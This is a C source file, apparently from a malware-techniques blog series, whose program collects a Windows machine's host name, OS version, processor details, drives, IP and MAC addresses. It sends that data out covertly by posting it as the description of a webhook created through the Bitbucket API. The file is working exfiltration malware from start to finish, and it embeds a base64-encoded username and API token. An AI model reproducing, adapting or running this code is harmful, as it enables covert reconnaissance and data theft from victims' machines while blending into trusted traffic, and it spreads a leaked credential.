/*
 * hack.c
 * sending systeminfo via legit URL. Bitbucket API
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/08/29/malware-tricks-51.html
 */
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <stdio.h>

// echo -n '<username>:<API_TOKEN>' | base64
#define BITBUCKET_TOKEN_BASE64 "Y29jb21lbG9ua3pAZ21haWwuY29tOkFUQVRUM3hGZkdGMDFyOUI4M0NOQVE3elpUNVJjX0ptVG4tN2dkNFY3S2I3eE5NTlViZGJidkdEVGNrWDlVU0hsREdQa2l5MHZ1WFgydWlzMW51Y1BIMXBESFBwZktoblc5N0tDUVdlM2tOb2x5NTZ6a0hZUmFuV2hvSUk5cWdiV2k0cXItaU9qS3FxdlJzZ1R1Ni0zQVA0ejJXRmtOazdyZDRRTWYwZ2Z6ZF9FU0ZUbUFwaE8waz1CMzE1MDcwRg==" // base64 username:token
#define BITBUCKET_WORKSPACE "meow-test" // replace with your workspace
#define BITBUCKET_REPO "meow-shellcode" // replace with your repo name

// send data to BitBucket using winhttp
int sendToBitbucket(const char* description) {
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;

  char authHeader[512];
 
  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), 
    "{\"description\": \"%s\", \"url\": \"https://meow-meow-hack.com/\", \"active\": true, "
        "\"secret\": \"this_is_a_really_bad_secret\", \"events\": [\"repo:push\", \"issue:created\"]}",
    description);

  DWORD bytesRead;
  char buffer[2048];

  snprintf(authHeader, sizeof(authHeader), "Authorization: Basic %s", BITBUCKET_TOKEN_BASE64);
 
  hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  hConnect = WinHttpConnect(hSession, L"api.bitbucket.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
 
  char path[512];
  snprintf(path, sizeof(path), "/2.0/repositories/%s/%s/hooks", BITBUCKET_WORKSPACE, BITBUCKET_REPO);
 
  wchar_t wpath[512];
  MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, 512);
 
  hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);
 
  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0);
  WinHttpReceiveResponse(hRequest, NULL);
 
  // get response (checking)
  WinHttpReceiveResponse(hRequest, NULL);
 
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
 
  return 0;
}
 
// get systeminfo and send as comment via GitHub API logic
int main(int argc, char* argv[]) {
 
  char systemInfo[4096];
 
  // get host name
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);
 
  // get OS version
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);
 
  // get system information
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);
 
  // get logical drive information
  DWORD drives = GetLogicalDrives();
 
  // get IP address
  IP_ADAPTER_INFO adapterInfo[16];
  DWORD adapterInfoSize = sizeof(adapterInfo);
  if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
    printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
    return 1;
  }
 
  snprintf(systemInfo, sizeof(systemInfo),
    "Host Name: %s, "
    "OS Version: %d.%d.%d, "
    "Processor Architecture: %d, "
    "Number of Processors: %d, "
    "Logical Drives: %X, ",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);
 
  // Add IP address information
  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
    "Adapter Name: %s, "
    "IP Address: %s, "
    "Subnet Mask: %s, "
    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X", 
    adapter->AdapterName,
    adapter->IpAddressList.IpAddress.String,
    adapter->IpAddressList.IpMask.String,
    adapter->Address[0], adapter->Address[1], adapter->Address[2],
    adapter->Address[3], adapter->Address[4], adapter->Address[5]);
  }
 
  int result = sendToBitbucket(systemInfo);
 
  if (result == 0) {
    printf("hook successfully created in Bitbucket.\n");
  } else {
    printf("failed to create hook in Bitbucket.\n");
  }
 
  return 0;
}